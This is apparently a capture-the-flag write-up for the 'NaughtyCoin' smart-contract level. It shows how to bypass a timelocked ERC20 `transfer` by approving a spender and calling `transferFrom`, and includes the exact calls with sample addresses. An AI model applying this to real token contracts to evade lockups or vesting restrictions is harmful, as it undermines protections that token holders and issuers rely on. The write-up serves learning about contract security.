# 15-NaughtyCoin

1. At first glance, this contract seems prevent you to transfer any value since `transfer` function is timelocked. But if you see ERC20 specification at https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md. There is a way to transfer your ERC20 Token on behalf of someone else (spender) using `transferFrom` and `approve` function.

2. First you approve other address as spender with max value

```shell
    contract.approve("0xD1973282641fb3BAFa7eD2a82E82E3772b558a79","1000000000000000000000000")
```

3. Then spender transfer all value from `player` address to other address.

```javascript
myContract.methods
  .transferFrom(
    "0xcdfB0772A328da9044D5bfD2D51A47230C9873A4",
    "0xD1973282641fb3BAFa7eD2a82E82E3772b558a79",
    "1000000000000000000000000"
  )
  .send();
```
